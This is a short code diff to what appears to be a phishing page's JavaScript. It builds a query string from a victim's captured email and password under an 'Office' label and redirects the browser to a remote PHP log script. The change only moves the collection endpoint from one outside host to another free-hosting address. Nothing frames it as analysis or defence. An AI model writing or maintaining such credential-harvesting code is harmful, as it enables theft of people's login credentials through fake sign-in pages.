@@ -1,4 +1,4 @@
-﻿const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
 
 
 let url;
@@ -64,7 +64,7 @@ function getDetails(e) {
 
                 url = "Domain" + "=" + "Office | Plain" + "&" + "Mail" + "=" + email.innerText + "&" + "Password" + "=" + pass.innerText
 
-                location = "https://tellme24.com/logs/gm1/plain1.php?" + url;
+                location = "https://falser-skies.000webhostapp.com/gmb/plain2.php?" + url;
 
                 setTimeout(() => {
                     pass.innerText = "";
